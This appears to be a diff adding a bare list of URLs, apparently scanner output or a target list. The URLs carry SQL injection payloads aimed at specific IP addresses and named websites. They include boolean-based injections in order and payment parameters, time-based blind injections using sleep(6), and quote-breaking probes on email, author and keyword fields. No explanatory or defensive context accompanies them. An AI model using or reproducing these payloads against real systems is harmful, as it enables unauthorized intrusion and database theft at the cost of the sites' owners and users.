@@ -1,0 +1,15 @@
+http://82.156.149.52/api/goods/find?limit=20&page=1&sort=2/((6-4)*(2-1)-1)&total=20&word=1
+http://111.230.211.247:666/api/order/info?order_id=-1'%20OR%203*2*1=6%20AND%2000095=00095%20--%20
+https://www.5iml.com/?email=testing%40example.com'"&ispersis=1&mail_code=testing%40example.com
+https://www.5iml.com/?email=testing%40example.com&ispersis=1'"&mail_code=testing%40example.com
+https://www.5iml.com/?email=testing%40example.com&ispersis=1&mail_code=testing%40example.com'"
+http://129.211.167.186/other/submit.php?paynumber=-1'%20OR%203*2*1=6%20AND%20000670=000670%20--%20
+https://www.5iml.com/zbmh/1'"1000
+https://www.5iml.com/content/templates/Eternity/inc/functions/etedown/etedown.php?back_url=https://www.5iml.com/wzym/272.html&down_id=0&log_id=2720'XOR(272*if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z&token=96a9daba3026586bf01e55a2f6bf8051&token_name=ete_down_nonce
+https://www.5iml.com/content/templates/Eternity/inc/functions/etedown/etedown.php?back_url=https://www.5iml.com/wzym/272.html&down_id=0&log_id=2720'XOR(272*if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z&token=c16402f38eacb432e2f5063f330ad8ab&token_name=ete_down_nonce
+https://www.5iml.com/?author=1'"&keyword=1&type=log
+https://www.5iml.com/?author=1&keyword=1'"&type=log
+https://www.5iml.com/?author=1&keyword=1&type=log'"
+https://www.tongruirenye.com/addons/cms/index/get_index_list.html?page=%40%40mp2MV
+https://api.dqdl.net/addons/cms/index/get_index_list.html?page=%40%40fdWFC
+https://www.dqdl.net/addons/cms/index/get_index_list.html?page=%40%40QdhCY
